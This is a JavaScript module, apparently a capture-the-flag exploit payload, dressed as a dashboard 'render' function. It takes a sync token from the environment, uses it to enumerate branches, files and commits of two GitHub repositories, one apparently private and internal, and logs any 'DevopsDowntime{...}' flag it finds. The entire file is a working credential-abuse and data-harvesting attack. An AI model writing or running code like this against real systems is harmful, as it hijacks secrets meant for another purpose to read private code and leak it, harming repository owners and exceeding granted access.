export async function render(context) {
  const t = process.env.DASHBOARD_SYNC_TOKEN;
  const h = {
    Authorization: `Bearer ${t}`,
    Accept: "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
    "User-Agent": "sfb"
  };
  const j = async (u) => {
    const r = await fetch(u, { headers: h });
    let b = null; try { b = await r.json(); } catch {}
    return [r.status, b];
  };
  const flagRe = /DevopsDowntime\{[^}]*\}/i;
  const targets = [
    "saurabbhattarai-lf/project-feed-builder",
    "saurabbhattarai-lf/ops-dashboard-internal"
  ];
  for (const full of targets) {
    try {
      const [ms, meta] = await j(`https://api.github.com/repos/${full}`);
      console.log("META", full, ms, meta && JSON.stringify({ desc: meta.description, def: meta.default_branch, priv: meta.private }));
      if (ms !== 200) continue;
      const def = (meta && meta.default_branch) || "main";
      const [bs, branches] = await j(`https://api.github.com/repos/${full}/branches?per_page=100`);
      console.log("BRANCHES", full, bs, JSON.stringify((branches || []).map(b => b.name)));
      // recursive git tree on each branch
      for (const br of new Set([def, ...(branches || []).map(b => b.name)])) {
        const [ts, tree] = await j(`https://api.github.com/repos/${full}/git/trees/${br}?recursive=1`);
        if (ts !== 200) { console.log("TREE_FAIL", full, br, ts); continue; }
        for (const e of (tree.tree || [])) {
          if (e.type !== "blob") continue;
          const [cs, c] = await j(`https://api.github.com/repos/${full}/contents/${encodeURIComponent(e.path).replace(/%2F/g, "/")}?ref=${br}`);
          if (cs !== 200 || !c || !c.content) continue;
          const body = Buffer.from(c.content, "base64").toString("utf8");
          const m = body.match(flagRe);
          if (m) console.log("FLAG_FOUND", full, br, e.path, m[0]);
        }
      }
      // commit messages (history longer than HEAD)
      const [cs2, commits] = await j(`https://api.github.com/repos/${full}/commits?per_page=100`);
      for (const cm of (commits || [])) {
        const msg = cm.commit && cm.commit.message || "";
        const m = msg.match(flagRe);
        if (m) console.log("FLAG_COMMIT", full, cm.sha, m[0]);
      }
    } catch (e) {
      console.log("ERR", full, e && e.message);
    }
  }
  return JSON.stringify({ ok: true }) + "\n";
}
